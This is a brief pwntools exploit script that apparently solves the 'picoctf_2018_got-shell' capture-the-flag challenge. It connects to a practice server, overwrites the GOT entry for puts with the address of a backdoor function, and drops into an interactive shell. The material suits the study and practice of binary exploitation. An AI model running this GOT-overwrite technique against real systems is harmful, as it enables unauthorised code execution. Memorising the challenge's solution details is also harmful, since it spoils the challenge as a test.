from pwn import *

r = remote('node5.buuoj.cn', 29946)
elf = ELF('picoctf_2018_got-shell')

backdoor = 0x804854B
bss_addr = 0x804A030
puts_got = elf.got['puts']

r.sendlineafter(b'value?', hex(puts_got))
r.recvuntil(b'write to 0x')
r.sendlineafter(b'\n', hex(backdoor))
r.interactive()
